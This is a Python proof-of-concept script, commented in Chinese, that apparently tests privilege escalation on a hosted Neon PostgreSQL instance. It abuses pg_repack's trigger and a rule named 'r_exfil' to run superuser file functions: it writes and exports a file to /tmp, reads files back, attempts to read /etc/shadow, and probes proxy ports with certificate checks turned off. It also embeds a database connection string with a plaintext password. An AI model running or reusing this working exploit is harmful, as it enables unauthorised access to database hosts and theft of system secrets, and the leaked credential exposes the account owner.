# -*- coding: utf-8 -*-
"""v6:写面证明(lo_create+lo_put+lo_export) + /etc/shadow 权限边界 + local_proxy 端口外测"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:300]

q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text, b bytea)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_exfil AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

def get_text():
    rows = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    return [r[0] for r in rows] if rows else None

def get_bytes():
    rows = q("SELECT b FROM k_out WHERE b IS NOT NULL LIMIT 1")
    return bytes(rows[0][0]) if rows else None

# --- [1] lo_create + lo_put 写大对象(WHERE void 技巧) ---
print('=== [1] 大对象创建 ===')
set_rule("INSERT INTO k_out(x) SELECT lo_create(0)::text")
fire()
loids = get_text()
print('  lo_create:', loids)
loid = int(loids[0]) if loids else None

if loid:
    print('=== [2] lo_put 写入内容 ===')
    set_rule("INSERT INTO k_out(x) SELECT 'written' WHERE lo_put(%d, 0, convert_to('K_PROOF_FILE_WRITE_2026','UTF8')) IS NULL" % loid)
    fire()
    print('  lo_put rule fire:', get_text())

    print('=== [3] lo_export 导出到 /tmp/k_proof.txt ===')
    set_rule("INSERT INTO k_out(x) SELECT 'exported' WHERE lo_export(%d, '/tmp/k_proof.txt') IS NULL" % loid)
    fire()
    print('  lo_export:', get_text())

    print('=== [4] 验证 /tmp 文件存在 + 读回内容 ===')
    set_rule("pg_ls_dir('/tmp')")
    fire()
    t = get_text()
    print('  /tmp:', t)
    set_rule("pg_read_file('/tmp/k_proof.txt')")
    fire()
    t = get_text()
    print('  readback:', t)

    # 大对象清理
    q("SELECT lo_unlink(%d)" % loid, fetch=False)
    print('  lo_unlink done')
    # /tmp 文件:覆盖为空再导出一次(最小化残留);剩余 /tmp 文件重启自动清理
    set_rule("INSERT INTO k_out(x) SELECT 'wiped' WHERE lo_export(%d, '/tmp/k_proof.txt') IS NULL" % loid)
    fire()
    print('  wipe export err expected(loid deleted):', get_text())

# --- [5] /etc/shadow 权限边界 ---
print('=== [5] /etc/shadow 读取判定 ===')
set_rule("pg_read_file('/etc/shadow')")
fire()
t = get_text()
print('  shadow:', 'READABLE(%d chars)' % len(t[0]) if t else 'DENIED')

# --- [6] pg_reload_conf / pg_rotate_logfile 可用性(不执行,只看函数存在与 ACL 于 cloud_admin 语义) ---
print('=== [6] 其他 superuser 内置函数基线(读类) ===')
for f, expr in [
    ("pg_ls_waldir", "pg_ls_waldir()"),
    ("pg_ls_logdir", "pg_ls_logdir()"),
    ("pg_stat_file", "pg_stat_file('/etc/hostname')"),
    ("pg_read_binary_file", "pg_read_binary_file('/etc/hostname')"),
]:
    set_rule("INSERT INTO k_out(x) SELECT count(*)::text FROM %s" % expr)
    fire()
    t = get_text()
    print('  %s: %s' % (f, t))

# 清理
q("DROP RULE IF EXISTS r_exfil ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()

# --- [7] local_proxy 端口外部探测 ---
print('=== [7] local_proxy 端口外部探测 ===')
import urllib.request, ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
for port in (4432, 10432):
    try:
        req = urllib.request.Request('https://ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build:%d/' % port, method='GET')
        resp = urllib.request.urlopen(req, timeout=10, context=ctx)
        print('  port %d: HTTP %d, body: %s' % (port, resp.status, resp.read(200)[:200]))
    except urllib.error.HTTPError as e:
        print('  port %d: HTTP %d, body: %s' % (port, e.code, e.read(200)[:200]))
    except Exception as e:
        print('  port %d: %s' % (port, str(e)[:150]))
